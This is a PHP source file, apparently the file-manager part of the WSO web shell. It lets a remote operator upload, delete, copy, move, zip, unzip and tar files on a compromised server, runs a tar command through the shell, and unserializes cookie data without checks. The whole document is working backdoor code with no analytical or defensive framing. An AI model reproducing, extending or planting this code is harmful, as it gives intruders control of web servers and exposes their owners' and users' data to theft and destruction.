<?php
function deleteDir($path) {
    $path = (substr($path,-1)=='/') ? $path:$path.'/';
    $dh  = opendir($path);
    while ( ($item = readdir($dh) ) !== false) {
        $item = $path.$item;
        if ( (basename($item) == "..") || (basename($item) == ".") )
            continue;
        $type = filetype($item);
        if ($type == "dir")
            deleteDir($item);
        else
            @unlink($item);
    }
    closedir($dh);
    @rmdir($path);
}

function copy_paste($c,$s,$d){
    if(is_dir($c.$s)){
        mkdir($d.$s);
        $h = @opendir($c.$s);
        while (($f = @readdir($h)) !== false)
            if (($f != ".") and ($f != ".."))
                copy_paste($c.$s.'/',$f, $d.$s.'/');
    } elseif(is_file($c.$s))
        @copy($c.$s, $d.$s);
}

function move_paste($c,$s,$d){
    if(is_dir($c.$s)){
        mkdir($d.$s);
        $h = @opendir($c.$s);
        while (($f = @readdir($h)) !== false)
            if (($f != ".") and ($f != ".."))
                copy_paste($c.$s.'/',$f, $d.$s.'/');
    } elseif(@is_file($c.$s))
        @copy($c.$s, $d.$s);
}

function actionFilesMan() {
    if (!empty ($_COOKIE['f'])) {
        $_COOKIE['f'] = @unserialize($_COOKIE['f']);
    }
    
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) {
					echo "Can't upload!";
                }
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2'])) {
					echo "Can't create!";
                }
				break;
			case 'delete':
				if (is_array(@$_POST['f'])) {
					foreach($_POST['f'] as $f) {
                        if ($f == '..') {
                            continue;
                        }
						$f = urldecode($f);
						if (is_dir($f)) {
							deleteDir($f);
                        } else {
							@unlink($f);
                        }
					}
                }
				break;
			case 'paste':
				if($_COOKIE['act'] == 'copy') {
					foreach($_COOKIE['f'] as $f) {
						copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']);
                    }
				} elseif($_COOKIE['act'] == 'move') {
					foreach($_COOKIE['f'] as $f) {
						@rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f);
                    }
				} elseif($_COOKIE['act'] == 'zip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($_POST['p2'], 1)) {
                            chdir($_COOKIE['c']);
                            foreach($_COOKIE['f'] as $f) {
                                if($f == '..') {
                                    continue;
                                }
                                if(@is_file($_COOKIE['c'].$f)) {
                                    $zip->addFile($_COOKIE['c'].$f, $f);
                                } elseif(@is_dir($_COOKIE['c'].$f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/', FilesystemIterator::SKIP_DOTS));
                                    foreach ($iterator as $key=>$value) {
                                        $zip->addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip->close();
                        }
                    }
				} elseif($_COOKIE['act'] == 'unzip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_COOKIE['f'] as $f) {
                            if($zip->open($_COOKIE['c'].$f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                        }
                    }
				} elseif($_COOKIE['act'] == 'tar') {
                    chdir($_COOKIE['c']);
                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                    wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    chdir($GLOBALS['cwd']);
				}
				unset($_COOKIE['f']);
                setcookie('f', '', time() - 3600);
				break;
			default:
                if(!empty($_POST['p1'])) {
					WSOsetcookie('act', $_POST['p1']);
					WSOsetcookie('f', serialize(@$_POST['f']));
					WSOsetcookie('c', @$_POST['c']);
				}
				break;
		}
	}
    wsoHeader();
	echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';

	$dirContent = wsoScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';wsoFooter(); return; }

    global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
    
    echo "<script> function sa() {for(i=0;i<d.files.elements.length;i++) { if(d.files.elements[i].type == 'checkbox') {d.files.elements[i].checked = d.files.elements[0].checked;}}}</script><table width='100%' class='main' cellspacing='0' cellpadding='2'><form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	
    for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' => wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function wsoCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "wsoCmp");
	usort($dirs, "wsoCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	
    foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?wsoViewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a href="#" title="Rename" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" title="Touch" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" title="Edit" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" title="Download" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
		$l = $l?0:1;
	}
	
    echo "<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    
    if (class_exists('ZipArchive')) {
        echo "<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>";
    }
    echo "<option value='tar'>Compress (tar.gz)</option>";
    if (!empty($_COOKIE['act']) && @count($_COOKIE['f'])) {
        echo "<option value='paste'>Paste / Compress</option>";
    }
    echo "</select>&nbsp;";
    if (!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar'))) {
        echo "file name: <input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
    }
    echo "<input type='submit' value='>>'></td></tr></form></table></div>";
	wsoFooter();
}